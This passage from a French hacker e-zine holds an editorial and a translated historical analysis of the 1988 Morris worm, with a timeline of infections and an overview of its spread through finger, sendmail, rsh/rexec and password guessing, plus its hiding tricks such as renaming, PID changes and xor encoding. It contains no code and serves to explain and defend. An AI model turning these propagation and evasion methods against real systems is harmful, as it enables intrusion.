<html>
<head>
<title>Land Of The Free #07</title>
<link rel="SHORTCUT ICON" href="fichiers/l.ico">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="Generator" content="Finger v2.0.3 & Brain v2.0.3">
<link rel="stylesheet" href="fichiers/lotfree07.css" type="text/css">
<link rel="stylesheet" href="fichiers/cas.css" type="text/css">
</head>

<body bgcolor="#FFFFFF" text="#000000">
<div align="left"></div>
<table border="1" cellpadding="0" cellspacing="1" bordercolor="#000099" align="center" width="100%">
  <tr> 
    <td valign="top" bgcolor="#0066CC" class="texttitre" width="100%"> <div align="center">Land 
        Of The FREE #07</div>
      <div align="center"></div></td>
  </tr>
  <tr> 
    <td valign="top" class="textgras" bgcolor="#000000">Sommaire</td>
  </tr>
  <tr> 
    <td height="116" valign="top" bgcolor="#3d599b"> <ol>
        <li class="menu2"><a href="#edito">Edito</a></li>
        <li class="menu2"><a href="#worm">A Tour of the Worm (sirius_black)</a></li>
        <li class="menu2"><a href="#voynich">Le mystère du manuscrit de Voynich 
          (Flyers)</a></li>
        <li class="menu2"><a href="#vol">Vol de session HTTP (sirius_black)</a></li>
        <li class="menu2"><a href="#covert_channel">Frenchy Covert Channel (Flyers)</a></li>
        <li class="menu2"><a href="#lutz">Toolz Armory --Lutz v0.4b-- (sirius_black)</a></li>
        <li class="menu2"><a href="#black2">S&eacute;curit&eacute; R&eacute;seau Avanc&eacute;e</a></li>
        <li class="menu2"><a href="#conclusion">Conclusion</a></li>
      </ol></td>
  </tr>
  <tr> 
    <td valign="top" class="textgras" bgcolor="#000000"><a name="edito"></a>Edito</td>
  </tr>
  <tr> 
    <td valign="top" class="textpetit">&nbsp;&nbsp;Et voici le nouveau Lotfree! 
      le septieme du nom, on a beaucoup trainer pour le r&eacute;aliser, manque 
      de temps et surtout d'inspiration. L'important c'&eacute;tait de faire un 
      digne successeur du dernier opus. 
      <p>&nbsp;&nbsp;Un nouveau collaborateur a rejoins le &quot;staff&quot;, 
        il s'agit de Flyers, welcome home ;) Sans lui, ce nouveau opus n'aurait 
        peut-&ecirc;tre jamais exister. Merci &agrave; toi!<br>
        Flyers nous a concoct&eacute; deux articles aussi bien l'un que l'autre. 
        Le premier intitul&eacute; &quot;Frenchy Covert Channel&quot; parle du 
        covert channel (on s'en serai dout&eacute;), &quot;technique ayant pour 
        but de faire passer au travers d'un firewall des donn&eacute;es&quot;. 
        Le deuxi&egrave;me article intitul&eacute; &quot;Le myst&egrave;re du 
        manuscrit de Voynich&quot;, &agrave; mettre dans la section crypto, est 
        une traduction d'un TRES bon article parlant d'une &quot;tentative&quot; 
        de d&eacute;cryptage d'un manuscrit m&eacute;di&eacute;val.</p>
      <p>&nbsp;&nbsp;Quant &agrave; sirius_black fid&egrave;le &agrave; ses habitudes 
        :p , il nous a &eacute;cris un article sur l'... HTTP, plus pr&eacute;cisement 
        sur le &quot;Vol de session HTTP&quot;, un article tr&eacute;s complet. 
        Le deuxi&egrave;me article est une traduction d'un article parlant du 
        ver (worm) le plus connu: le Morris Worm un texte tout aussi complet que 
        le pr&eacute;c&eacute;dent. Le troisi&egrave;me article inaugure une nouvel 
        section dans ce mag: Toolz Armory; il s'agit de pr&eacute;senter un outil 
        (un soft) qu'on appr&eacute;cie ou qu'on souhaite am&eacute;liorer, 
        dans le cas &eacute;ch&eacute;ant il s'agit de Lutz un &quot;nmap-like&quot;. 
        Enfin, le dernier article est une traduction d'un compte rendu d'un 
        pentest (test d'intrusion).</p>
      <p>&nbsp;&nbsp;Et moi dans tout cela?! bein rien... :p</p>
      <p>&nbsp;&nbsp;Vous aurez peut-&ecirc;tre remarquer que l'interface de ce num&eacute;ro 
        est la m&ecirc;me que celle du Lotfree#05. En effet, on nous a reproch&eacute; 
        le manque de &quot;finition&quot; de l'interface du pr&eacute;c&eacute;dent 
        num&eacute;ro qui &eacute;tait un peu trop wonderland ;) Qui sait! c'est 
        peut-&ecirc;tre pour &ccedil;a que notre mag n'est pas sur madchat MDR</p>
      <p align="right"><strong>OS4M4CKERS[chez]imel[point]org</strong></p></td>
  </tr>
  <tr> 
    <td valign="top" class="textgras" bgcolor="#000000"><a name="worm" id="worm"></a>A 
      Tour of the Worm</td>
  </tr>
  <tr> 
    <td valign="top" class="textpetit"> <div align="left"> 
        <p><i>Donn Seeley</i><br>
          Department of Computer Science<br>
          University of Utah </p>
        <p><i>EXTRAIT</i></p>
        <blockquote> 
          <div align="left"> 
            <p><br>
              Le soir du 2 novembre 1988, un programme auto r&eacute;pliquant 
              a &eacute;t&eacute; lanc&eacute; sur Internet (<a href="#f1" name="rf1">1</a>). 
              Ce programme (un ver) a envahi des VAX et des ordinateurs Sun-3 
              faisant tourner des versions de l'UNIX de Berkeley et les a utilis&eacute; 
              pour infecter encore plus d'ordinateurs (<a href="#f2" name="rf2">2</a>). 
              En l'espace de quelques heures ce programme s'est r&eacute;pandu 
              &agrave; travers les Etats-Unis, infectant des centaines de milliers 
              de machines et les rendant inutilisables &agrave; cause de l'encombrement 
              que provoquait son ex&eacute;cution. Ce document pr&eacute;sente 
              une chronologie de cet &eacute;v&eacute;nement ainsi qu'une description 
              d&eacute;taill&eacute;e du fonctionnement du ver, bas&eacute;e sur 
              une version en C du ver obtenue en le d&eacute;compilant.</p>
          </div>
        </blockquote>
        <div align="left"></div>
        <div align="left"> 
          <p><b>Table des mati&egrave;res</b></p>
          <dl>
            <dt>1. <a 
  href="#p1">Introduction</a> 
            <dt>2. <a 
  href="http://packetstormsecurity.nl/docs/hack/worm.html#p2">Chronologie</a> 
            <dt>3. <a 
  href="#p3">Vue d'ensemble</a> 
            <dt>4. <a 
  href="#p4">Etude d&eacute;taill&eacute;e</a> 
            <dt> 
              <dl>
                <dt>4.1. <a 
    href="#p41">Le processus principal</a> 
                <dt>4.2. <a 
    href="#p42">Structures de donn&eacute;es</a> 
                <dt>4.3. <a 
    href="#p43">Croissance de la population</a> 
                <dt>4.4. <a 
    href="#p44">La recherche de nouvelles machines &agrave; infecter</a> 
                <dt>4.5. <a 
    href="#p45">Failles de s&eacute;curit&eacute;</a> 
                  <dl>
                    <dt>4.5.1. <a 
      href="#p451"><i>Rsh</i> et <i>rexec</i></a> 
                    <dt>4.5.2. <a 
      href="#p452"><i>Finger</i></a> 
                    <dt>4.5.3. <a 
      href="#p453"><i>Sendmail</i></a> </dt>
                  </dl>
                <dt>4.6. <a href="#p46">Infection</a> 
                <dt>4.7. <a 
    href="#p47">Cassage de mot de passe</a> 
                  <dl>
                    <dt>4.7.1. <a 
      href="#p471">Deviner les mots de passe</a> 
                    <dt>4.7.2. <a 
      href="#p472">Cryptage plus rapide des mots de passe</a></dt>
                  </dl>
                </dt>
              </dl>
            <dt>5. <a 
  href="#p5">Opinions</a> 
            <dt>6. <a 
  href="#p6">Conclusion</a> 
            <dt><a 
  href="#p7">Remerciements</a></dt>
          </dl>
          <p class="texttitre"><a name="p1"></a>1. Introduction</p>
        </div>
        <blockquote> 
          <div align="left"> 
            <p>There is a fine line between helping administrators protect their 
              systems and providing a cookbook for bad guys. [Grampp and Morris, 
              &quot;UNIX Operating System Security&quot;]</p>
          </div>
        </blockquote>
        <div align="left">Le 3 novembre 1988 allait devenir le Jeudi Noir. Les 
          administrateurs syst&egrave;me de tout le pays venaient pour travailler 
          et d&eacute;couvrirent ce jour l&agrave; que leurs r&eacute;seaux d'ordinateurs 
          &eacute;taient soumis &agrave; de forts traitements. S'ils parvenaient 
          &agrave; s'identifier et &agrave; g&eacute;n&eacute;rer un statut du 
          syst&egrave;me, ils voyaient une douzaine ou une centaine de processus 
          de &quot;shell&quot; (interpr&eacute;teur de commande). S'ils essayaient 
          de tuer les processus, ils s'apercevaient que de nouveaux processus 
          apparaissaient plus vite qu'ils ne pouvaient les tuer. Red&eacute;marrer 
          l'ordinateur n'avait pas plus d'effet : au bout de quelques minutes 
          la machine &eacute;tait &agrave; nouveau surcharg&eacute;e par ces myst&eacute;rieux 
          processus. 
          <p>Ces syst&egrave;mes avaient &eacute;t&eacute; envahis par un <i>ver</i>. 
            Un ver et un programme qui se propage tout seul sur un r&eacute;seau, 
            utilisant les ressources d'une machine pour en attaquer une autre 
            (Un ver n'est pas tout &agrave; fait similaire &agrave; un <i>virus</i> 
            qui est un fragment de programme qui s'ins&egrave;re dans d'autres 
            programmes). Le ver profitait de trous dans la s&eacute;curit&eacute; 
            de syst&egrave;mes qui utilisaient BSD UNIX 4.2 ou 4.3 ou des d&eacute;riv&eacute;s 
            comme SunOS. Ces trous lui permettait de se connecter aux machines 
            d'un r&eacute;seau, de contourner leur authentification, de se reproduire 
            (se recopier) puis d'attaquer toujours plus de machines. Les chargements 
            massifs &eacute;taient d&ucirc; aux multitudes de vers qui essayaient 
            de propager l'&eacute;pid&eacute;mie.</p>
          <p>L'Internet n'avait jamais &eacute;t&eacute; attaqu&eacute; de cette 
            fa&ccedil;on auparavant, bien qu'il y avait beaucoup de chance pour 
            qu'une telle attaque soit en pr&eacute;paration. La plupart des administrateurs 
            n'&eacute;taient pas familiers avec le concept de ver (&agrave; l'oppos&eacute; 
            des virus, qui sont une plus grande menace au monde des PCs) et il 
            leur a fallu du temps avant qu'ils comprennent ce qui se passait et 
            comment g&eacute;rer &ccedil;a. Le but de ce document est d'expliquer 
            aux gens ce qui s'est pass&eacute; et comment cela est arriv&eacute;, 
            afin qu'ils soient mieux pr&eacute;par&eacute;s lorsque cela se reproduira. 
            Le comportement du ver sera &eacute;tudi&eacute; en d&eacute;tail, 
            &agrave; la fois pour montrer exactement ce qu'il faisait et ne faisait 
            pas et aussi pour montrer les dangers des futurs vers. Comme les informations 
            sont bien connues, que des milliers d'ordinateurs poss&egrave;dent 
            leurs copies du vers, il semble improbable que ce document puisse 
            causer des dommages, m&ecirc;me si cela reste troublant. Les opinions 
            sur le sujet et les autres probl&egrave;mes seront offertes plus tard.</p>
          <p class="texttitre"><a name="p2"></a>2. Chronologie</p>
        </div>
        <blockquote> 
          <div align="left"> 
            <p>Remember, when you connect with another computer, you're connecting 
              to every computer that computer has connected to. [Dennis Miller, 
              on NBC's Saturday Night Live]</p>
            <p>Here is the gist of a message I got: I'm sorry. [Andy Sudduth, 
              in an anonymous posting to the TCP-IP list on behalf of the author 
              of the worm, 11/3/88]</p>
          </div>
        </blockquote>
        <div align="left"> 
          <p>Beaucoup de d&eacute;tails sur la chronologie des attaques ne sont 
            pas encore disponibles. La liste suivante repr&eacute;sente la date 
            et l'heure des diff&eacute;rents &eacute;v&egrave;nements connus.</p>
          <dl>
            <dt>2/11 &agrave; 18 : 24 (approx.) 
            <dd>C'est la date et l'heure &agrave; laquelle les fichiers du ver 
              ont &eacute;t&eacute; trouv&eacute;s sur la machine <i>prep.ai.mit.edu</i>, 
              un VAX 11/750 du Laboratoire d'Intelligence Artificielle du MIT. 
              Ces fichiers ont &eacute;t&eacute;s retir&eacute;s plus tard, et 
              l'heure exacte a &eacute;t&eacute; perdue. Pendant deux semaines 
              il fut impossible de se loger sur <i>prep</i>. Le syst&egrave;me 
              ne gardait pas de logs et les disques n'&eacute;taient pas sauvegard&eacute;s 
              sur cassette : une cible parfaite. Un certain nombre de &quot;visiteurs&quot; 
              (des personnes utilisant des comptes publiques) a &eacute;t&eacute; 
              remarqu&eacute; ce soir l&agrave;. Ces utilisateurs auraient du 
              appara&icirc;tre dans les logs de sessions, mais regardez ce qui 
              suit. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 18 : 24</div>
        <div align="left"> 
          <dl>
            <dd>Premi&egrave;re infection connue sur la cote ouest : <i>rand.org</i> 
              &agrave; Rand Corp, Santa Monica. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 19 : 04</div>
        <div align="left"> 
          <dl>
            <dd><i>csgw.berkeley.edu</i> est infect&eacute;. Cette machine est 
              un des routeurs principaux du r&eacute;seau de UC Berkeley. Mike 
              Karels et Phil Lapsley ont d&eacute;couvert l'infection peu de temps 
              apr&egrave;s. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 19 : 54</div>
        <div align="left"> 
          <dl>
            <dd><i>mimsy.umd.edu</i> est attaqu&eacute; par le biais de son serveur 
              <i>finger</i>. Cette machine se trouve au d&eacute;partement informatique 
              de l'Universit&eacute; de Maryland. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 20 : 00 (approximatif)</div>
        <div align="left"> 
          <dl>
            <dd>Les Suns du laboratoire d'I.A. du MIT sont attaqu&eacute;s. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 20 : 28</div>
        <div align="left"> 
          <dl>
            <dd>Premi&egrave;re attaque <i>sendmail</i> sur <i>mimsy.</i> 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 20 : 40</div>
        <div align="left"> 
          <dl>
            <dd>L'&eacute;quipe de Berkeley se rend compte des attaques <i>Sendmail</i> 
              et <i>Rsh</i>, remarque les erreurs sur les services <i>telnet</i> 
              et <i>finger</i> et commence &agrave; d&eacute;sactiver ces services. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 20 : 49</div>
        <div align="left"> 
          <dl>
            <dd><i>cs.utah.edu</i> est infect&eacute;. Ce VAX 8600 est la machine 
              principale du d&eacute;partement informatique de l'Universit&eacute; 
              d'Utah. Les &eacute;v&egrave;nements suivant d&eacute;crivent les 
              attaques &agrave; Utah et sont repr&eacute;sentatives des autres 
              infections &agrave; travers le pays. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 21 : 09</div>
        <div align="left"> 
          <dl>
            <dd>Premi&egrave;re attaque <i>sendmail</i> sur <i>cs.utah.edu</i>. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 21 : 21</div>
        <div align="left"> 
          <dl>
            <dd>La moyenne de charge sur <i>cs.utah.edu</i> atteint 5. La &quot;moyenne 
              de charge&quot; est une valeur g&eacute;n&eacute;r&eacute;e par 
              le syst&egrave;me qui repr&eacute;sente le nombre moyen de jobs 
              dans la fille d'attente durant la derni&egrave;re minute ; une charge 
              de 5 sur un VAX 8600 d&eacute;grade de fa&ccedil;on notable les 
              temps de r&eacute;ponse alors qu'une charge de plus de 20 est une 
              d&eacute;gradation drastique. A 9 heures du soir, la charge est 
              g&eacute;n&eacute;ralement entre 0.5 et 2. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 21 : 41</div>
        <div align="left"> 
          <dl>
            <dd>La moyenne de charge de <i>cs.utah.edu</i> atteint 7. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 22 : 01</div>
        <div align="left"> 
          <dl>
            <dd>La moyenne de charge de <i>cs.utah.edu</i> atteint 16. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 22 : 06</div>
        <div align="left"> 
          <dl>
            <dd>Le nombre maximum de processus diff&eacute;rents en cours d'ex&eacute;cution 
              (100) est atteint sur <i>cs.utah.edu</i> ; le syst&egrave;me est 
              inutilisable. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 22 : 20</div>
        <div align="left"> 
          <dl>
            <dd>Jeff Forys d'Utah tue les vers sur <i>cs.utah.edu</i>. Les machines 
              Sun de Utah sont infect&eacute;es. A 22 : 41 la re-infection provoque 
              une moyenne de charge de 27 sur <i>cs.utah.edu</i>. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 22 : 49</div>
        <div align="left"> 
          <dl>
            <dd>Forys red&eacute;marre <i>cs.utah.edu</i>. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 23 : 21</div>
        <div align="left"> 
          <dl>
            <dd>La re-infection fait grimper la moyenne de charge &agrave; 37 
              sur <i>cs.utah.edu</i> malgr&eacute; les efforts r&eacute;p&eacute;t&eacute;s 
              de Forys pour tuer les vers. 
              <p></p>
          </dl>
        </div>
        <div align="left">2/11 &agrave; 23 : 28</div>
        <div align="left"> 
          <dl>
            <dd>Peter Yee du Centre de Recherche de NASA Ames envoie un message 
              d'avertissement &agrave; la liste de diffusion TCP-IP : &quot;Nous 
              sommes en ce moment sous les attaques d'un VIRUS Internet. Il a 
              frapp&eacute; UC Berkeley, UC San Diego, Lawrence Livermore, Stanford, 
              et NASA Ames.&quot; Il sugg&egrave;re de stopper les services <i>telnet</i>, 
              <i>ftp</i>, <i>finger</i>, <i>rsh</i> et SMTP. Il ne mentionne pas 
              <i>rexec</i>. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 00 : 34</div>
        <div align="left"> 
          <dl>
            <dd>Andy Sudduth de Harvard poste anonymement un avertissement sur 
              la liste TCP-IP : &quot;Il doit y avoir un virus perdu sur l'Internet.&quot; 
              C'est le premier message qui explique (bri&egrave;vement) comment 
              l'attaque <i>finger</i> marche, d&eacute;crit comment se prot&eacute;ger 
              de l'attaque SMTP en recompilant <i>sendmail</i>, et mentionne de 
              fa&ccedil;on explicite l'attaque <i>rexec</i>. Malheureusement le 
              message de Sudduth est bloqu&eacute; &agrave; <i>relay.cs.net</i> 
              alors que le routeur est &eacute;teint pour combattre le ver. Le 
              message ne sera d&eacute;livr&eacute; que deux jours apr&egrave;s. 
              Sudduth r&eacute;v&eacute;la &ecirc;tre l'auteur du message le 5 
              novembre. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 02 : 54</div>
        <div align="left"> 
          <dl>
            <dd>Keith Bostic envoie un correctif pour <i>sendmail</i> au newsgroup 
              comp.bugs.4bsd.ucb-fixes et &agrave; la liste TCP-IP. Ces correctifs 
              (et les suivants) sont aussi envoy&eacute;s aux administrateurs 
              des syst&egrave;mes importants &agrave; travers le pays. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 t&ocirc;t la matin</div>
        <div align="left"> 
          <dl>
            <dd>Les logs de session wtmp sont myst&eacute;rieusement effac&eacute;es 
              de <i>prep.ait.mit.edu</i>. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 05 : 07</div>
        <div align="left"> 
          <dl>
            <dd>Edward Wang de Berkeley remarque et averti de l'attaque <i>finger</i> 
              mais son message ne parvient &agrave; Mike Karel's que 12 heures 
              plus tard. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 09 : 00</div>
        <div align="left"> 
          <dl>
            <dd>Le congr&egrave;s annuel de Berkeley Unix se d&eacute;roule &agrave; 
              UC Berkeley. 40 ou plus des plus importants administrateurs syst&egrave;mes 
              et hackers sont en ville &agrave; discuter, quand la catastrophe 
              arrive chez eux. Plusieurs personnes qui avaient d&eacute;cid&eacute; 
              de prendre l'avion jeudi matin sont immobilis&eacute;es par la crise. 
              Keith Bostic passe la plus grande partie de la journ&eacute;e au 
              t&eacute;l&eacute;phone au bureau du Groupe de Recherche en Syst&egrave;mes 
              Informatiques &agrave; r&eacute;pondre aux appels d'administrateurs 
              syst&egrave;mes paniqu&eacute;s venant de tout le pays. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 15 : 00 (approximatif)</div>
        <div align="left"> 
          <dl>
            <dd>L'&eacute;quipe du MIT Athena appelle Berkeley pour lui expliquer 
              le fonctionnement du bug des serveurs <i>finger</i>. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 16 : 26</div>
        <div align="left"> 
          <dl>
            <dd>Dave Pare arrive dans les bureaux du Berkeley CSRG ; le d&eacute;sassemblage 
              et la d&eacute;compilation se font petit &agrave; petit avec les 
              outils sp&eacute;cialis&eacute;s de Pare. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 18 : 00 (approximatif)</div>
        <div align="left"> 
          <dl>
            <dd>Le groupe de Berkeley exp&eacute;die des calzones (sorte de pizzas 
              pli&eacute;es). Les gens font des va et vient ; les bureaux sont 
              bond&eacute;s, l'excitation est au plus fort. 
              <p></p>
          </dl>
        </div>
        <div align="left">3/11 &agrave; 19 : 18</div>
        <div align="left"> 
          <dl>
            <dd>Keith Bostic envoie un correctif pour le serveur <i>finger</i>. 
              <p></p>
          </dl>
        </div>
        <div align="left">4/11 &agrave; 06 : 00</div>
        <div align="left"> 
          <dl>
            <dd>Les membres de l'&eacute;quipe Berkeley, avec le ver presque enti&egrave;rement 
              d&eacute;sassembl&eacute; et largement d&eacute;compil&eacute;, 
              prennent finalement quelques heures de sommeil avant de retourner 
              au travail. 
              <p></p>
          </dl>
        </div>
        <div align="left">4/11 &agrave; 12 : 36</div>
        <div align="left"> 
          <dl>
            <dd>Theodore Ts'o du Projet Athena du MIT annonce publiquement que 
              le MIT et Berkeley ont compl&egrave;tement d&eacute;sassembl&eacute; 
              le ver. 
              <p></p>
          </dl>
        </div>
        <div align="left">4/11 &agrave; 17 : 00 (approximatif)</div>
        <div align="left"> 
          <dl>
            <dd>Une courte pr&eacute;sentation du ver est faite &agrave; la fin 
              du congr&egrave;s Berkeley Unix. 
              <p></p>
          </dl>
        </div>
        <div align="left">8/11</div>
        <div align="left"> 
          <dl>
            <dd>D&eacute;roulement du meeting du National Computer Security Center 
              afin de discuter du ver. Il y a environ 50 participants. 
              <p></p>
          </dl>
        </div>
        <div align="left">11/11 &agrave; 00 : 38</div>
        <div align="left"> 
          <dl>
            <dd>Les sources du ver, enti&egrave;rement d&eacute;compil&eacute;es 
              et comment&eacute;es sont install&eacute;es &agrave; Berkeley. 
              <p></p>
            </dd>
          </dl>
          <p class="texttitre"><a name="p3"></a>3. Vue d'ensemble</p>
          <p>Que faisait exactement le ver pour provoquer une telle &eacute;pid&eacute;mie 
            ? Le ver est compos&eacute; d'une routine d'amor&ccedil;age (bootstrap 
            en Anglais. C'est la partie du ver qui est ex&eacute;cut&eacute;e 
            et qui se charge de placer une copie du ver sur les machines infect&eacute;es) 
            de 99 lignes &eacute;crites en langage C, plus un gros fichier objet 
            qui change selon la plate-forme (VAX ou Sun-3). De toute &eacute;vidence 
            ce fichier objet a &eacute;t&eacute; g&eacute;n&eacute;r&eacute; &agrave; 
            partir de sources en C, il &eacute;tait donc naturel de d&eacute;compiler 
            le langage machine en C ; nous avons maintenant plus de 3200 lignes 
            de code C comment&eacute; qui peut se recompiler et qui est quasi-complet. 
            Nous sommes oblig&eacute;s de commencer l'&eacute;tude du ver par 
            une rapide vue d'ensemble des objectifs du ver, suivi d'une discussion 
            en profondeur sur les diff&eacute;rents comportements du ver r&eacute;v&eacute;l&eacute;s 
            lors de la d&eacute;compilation.</p>
          <p>Les activit&eacute;s du ver se divisent en deux cat&eacute;gories 
            : l'attaque et la d&eacute;fense. L'attaque consiste &agrave; trouver 
            des machines (et des comptes) &agrave; p&eacute;n&eacute;trer, puis 
            &agrave; exploiter des trous de s&eacute;curit&eacute; sur des machines 
            distantes pour y placer une copie du ver et la mettre en marche. Le 
            ver obtient des noms d'h&ocirc;tes en regardant dans les fichiers 
            syst&egrave;me<i> /etc/hosts.equiv</i> et dans<i> /.rhosts</i>, dans 
            les fichiers des utilisateurs comme le <i>.forward</i> et <i>rhosts</i>, 
            en analysant les donn&eacute;es de routage dynamique produites par 
            le programme <i>netstat</i> et enfin en g&eacute;n&eacute;rant des 
            adresses IP al&eacute;atoires sur le r&eacute;seau local. Il les classe 
            par ordre de pr&eacute;f&eacute;rence, commen&ccedil;ant d'abord par 
            le fichier <i>/etc/hosts.equiv</i> parce qu'il contient des noms de 
            machines locales qui sont susceptibles d'accepter des connexions sans 
            authentification. La p&eacute;n&eacute;tration d'un syst&egrave;me 
            distant peu s'effectuer d'une des trois fa&ccedil;ons suivantes. Le 
            ver peut profiter d'un bug dans le serveur finger qui lui fera t&eacute;l&eacute;charger 
            le code malveillant puis le lui faire ex&eacute;cuter. Le ver peut 
            utiliser une br&egrave;che dans le service de messagerie SMTP <i>sendmail</i>, 
            lui faire ex&eacute;cuter des commandes dans un shell et t&eacute;l&eacute;charger 
            le code &agrave; travers une connexion mail. Si le ver p&eacute;n&egrave;tre 
            un compte local en devinant son mot de passe, il peut utiliser les 
            services de commande &agrave; distance <i>rexec</i> et <i>rsh</i> 
            pour attaquer des machines qui partagent le m&ecirc;me compte. Dans 
            tous les cas, le ver s'arrange pour obtenir un shell distant qu'il 
            utilisera pour se propager, se compiler et ex&eacute;cuter la routine 
            de 99 lignes. Cette routine &eacute;tablie sa propre connexion avec 
            le ver local afin de r&eacute;cup&eacute;rer les diff&eacute;rents 
            fichiers dont elle a besoin, et en regroupant ces diff&eacute;rents 
            morceaux un nouveau ver est cr&eacute;&eacute; et la proc&eacute;dure 
            d'infection recommence encore et encore. Les tactiques de d&eacute;fense 
            se classent en trois cat&eacute;gories : emp&ecirc;cher la d&eacute;tection 
            de l'intrusion, interdire l'analyse du programme et identifier les 
            autres vers. La m&eacute;thode la plus simple pour le ver de se cacher 
            est de changer son nom. Quand il se d&eacute;clenche, il efface sa 
            liste d'arguments (argv) et fixe l'argument num&eacute;ro z&eacute;ro 
            &agrave; <i>sh</i>, le faisant passer pour un innocent interpr&eacute;teur 
            de commande. Il utilise la commande <i>fork()</i> pour changer son 
            PID, et ne reste jamais tr&egrave;s longtemps avec le m&ecirc;me ID. 
            Ces deux tactiques ont pour objectif de camoufler la pr&eacute;sence 
            du ver dans les listings d'&eacute;tat du syst&egrave;me (logs, etc.) 
            Le ver essaie de laisser le moins de traces possibles, au d&eacute;marrage 
            il met en m&eacute;moire tous les fichiers dont il a besoin et efface 
            les copies qui pourraient r&eacute;v&eacute;ler sa pr&eacute;sence. 
            Il emp&ecirc;che aussi la g&eacute;n&eacute;ration de fichiers core, 
            si bien que si le ver plante, il ne laisse pas de preuve de son passage 
            &agrave; travers la pr&eacute;sence de dumps core. Cette derni&egrave;re 
            tactique est aussi cr&eacute;e pour emp&ecirc;cher l'analyse du programme 
            : cela emp&ecirc;che un administrateur d'envoyer un signal qui forcerait 
            le programme &agrave; g&eacute;n&eacute;rer un fichier core. Cependant 
            il y a d'autres m&eacute;thodes d'obtenir un fichier core, si bien 
            que le ver remplace minutieusement certains octets en m&eacute;moire 
            (des caract&egrave;res) pour &ecirc;tre extrait plus difficilement. 
            Les copies sur le disque sont encod&eacute;es en r&eacute;p&eacute;tant 
            un xor sur une s&eacute;quence de 10 octets ; les cha&icirc;nes de 
            caract&egrave;res static sont encod&eacute;es octets apr&egrave;s 
            octets en effectuant un xor avec la valeur hexad&eacute;cimale 0x81, 
            &agrave; l'exception d'une liste priv&eacute;e qui est encod&eacute;e 
            avec le code hexad&eacute;cimal 80. Si les fichiers du ver sont toutefois 
            captur&eacute;s avant que le ver ne les ai effac&eacute;s, les fichiers 
            objets ont &eacute;t&eacute; charg&eacute; de telle fa&ccedil;on que 
            la plupart des entr&eacute;es non essentielles de la table des symboles 
            ont &eacute;t&eacute; effac&eacute;es, emp&ecirc;chant de comprendre 
            le r&ocirc;le d'une routine en se basant sur son nom. Le ver fait 
            aussi un effort trivial pour stopper les programmes qui voudraient 
            profiter de ses communications ; en th&eacute;orie un site bien attaqu&eacute; 
            peut emp&ecirc;cher l'infection en envoyant un message aux ports sur 
            lequel le ver &eacute;coute, si bien que le ver fait bien attention 
            &agrave; tester les connexions en &eacute;tablissant un court &eacute;change 
            de &quot;chiffres magiques&quot; al&eacute;atoires.</p>
          <p>Quand on &eacute;tudie un programme malicieux comme celui-l&agrave;, 
            il est tout aussi important de faire la liste de ce qu'il ne fait 
            pas que la liste de ce qu'il fait. Ce ver n'efface pas de fichiers 
            syst&egrave;mes : il efface juste les fichiers qu'il a cr&eacute;e 
            durant le processus d'amor&ccedil;age. Ce programme ne tente pas de 
            mettre hors d'&eacute;tat de marche le syst&egrave;me en supprimant 
            des fichiers importants. Il n'efface pas les fichiers de log ou ne 
            va pas perturber d'op&eacute;rations normales si ce n'est en consommant 
            des ressources syst&egrave;mes. Le ver n'alt&egrave;re pas de fichiers 
            existants : ce n'est pas un virus. Le ver se propage en se copiant 
            et en se compilant lui-m&ecirc;me sur chaque syst&egrave;me ; il ne 
            modifie aucun programme pour parvenir &agrave; ce r&eacute;sultat. 
            A cause de sa m&eacute;thode d'infection, il ne poss&egrave;de pas 
            les privil&egrave;ges suffisant qui lui permettraient de modifier 
            des programmes. Le worm n'installe pas de chevaux de Troie : sa m&eacute;thode 
            d'attaque est uniquement active, il n'attend jamais qu'un utilisateur 
            tombe dans un pi&egrave;ge. Une partie de la raison pour laquelle 
            il n'installe pas de troyen est qu'il ne peut pas se permettre de 
            perdre son temps &agrave; attendre l'ex&eacute;cution d'un ex&eacute;cutable 
            par l'utilisateur - il doit se reproduire avant qu'il soit d&eacute;couvert. 
            Enfin, le ver ne transmet, ni n'enregistre les mots de passes d&eacute;crypt&eacute;s 
            : sauf pour sa liste statique de ses passwords pr&eacute;f&eacute;r&eacute;s, 
            le ver ne passe pas les mots de passes crack&eacute;s &agrave; de 
            nouveaux vers ni ne les renvoie vers une machine centrale. Cela ne 
            veut en aucun cas dire que les comptes p&eacute;n&eacute;tr&eacute;s 
            par le ver sont s&ucirc;r simplement parce que le ver n'a communiqu&eacute; 
            les passwords &agrave; personne, &eacute;videmment, si le ver peut 
            deviner le mot de passe d'un compte alors des personnes pourront certainement 
            le faire. Le ver n'essaye pas de r&eacute;cup&eacute;rer les privil&egrave;ges 
            du super utilisateur : alors qu'il fait tout pour p&eacute;n&eacute;trer 
            des comptes, il n'a a aucun moment besoin des privil&egrave;ges particuliers 
            pour se propager, et ne fait aucun usage sp&eacute;cial de ces privil&egrave;ges 
            m&ecirc;me s'il les obtient. Le ver ne se propage pas &agrave; travers 
            uucp, x.25, DECNET ou BITNET : il requiert sp&eacute;cifiquement TCP/IP. 
            Le worm n'infecte pas de syst&egrave;mes System V &agrave; moins qu'ils 
